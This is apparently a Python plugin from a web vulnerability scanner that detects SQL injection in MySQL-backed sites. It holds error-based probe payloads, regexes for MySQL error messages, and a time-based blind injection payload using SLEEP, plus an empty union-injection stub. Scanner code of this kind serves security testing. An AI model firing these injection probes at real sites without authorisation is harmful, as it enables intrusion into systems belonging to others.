#! usr/bin/python 
#coding=utf-8 

import re
from copy import deepcopy

from moudle.lurkscan.pluginmanager import Check
from moudle.lurkscan.plugins.sqlinject.sqlinject import SqlInject
from moudle.lurkscan.plugins.sqlinject.sqlinject import InjectEntity

class ErrorInject(SqlInject, Check):
	
	def __init__(self):
		self.__errors = self.load_errors()
	
	def _load_payloads(self):
		return ['%27','%22','%27%27','%27%22',';',')','%27)','%22)','%22);','%27;','%22;','%%27','%%22','%%27)','%%22)','%27))','%22))','%22)))']
	
	def load_errors(self):
		return [r'SQL syntax.*?MySQL', 
				r'Warning.*?mysql_', 'MySqlException \(0x', 
				r'valid MySQL result', 
				r'check the manual that corresponds to your (MySQL|MariaDB) server version', 
				r'MySqlClient\.',
				r'MySqlClient\.',
				r'com\.mysql\.jdbc\.exceptions']
	
	def _check(self, inject):
		for error in self.__errors:
			if re.search(error, inject.content, re.I):
				return error
		
class TimeInject(SqlInject, Check):
	
	def __init__(self):
		#测试正常响应时间的次数
		self.__test_num = 3
		#响应时间平均数
		self.__mean = 0
		#秒
		self.time = [4, 5, 6]
	
	def _load_payloads(self):
		payloads_raw = ['%27%20AND%20SLEEP({time})%20AND%20%27TgYR%27%3d%27TgYR']
		payloads = []
		for i in range(0, self.__test_num):
			payloads.append('')
		for i in range(2, len(payloads)):
			for t in self.time:
				for y in range(0, len(payloads_raw)):
					payloads.append(payloads_raw[y].replace('{time}',str(t)))
		return payloads
	
	def get_timeout(self):
		return 7
	
	def _check(self, inject):
		diff = inject.time_diff()
		#计算平均值
		if self.__test_num > 0:
			if not self.__mean:
				self.__mean = diff
			self.__mean = (self.__mean + diff)/2
		else:
			#时间差大于最小的sleep时间则是时间盲注
			self.__test_num = 3
			#TODO 判断不准确，下版本升级
			return (diff - self.__mean) >= self.time[0]
		self.__test_num -= 1
		
class UnionInject(SqlInject):
	pass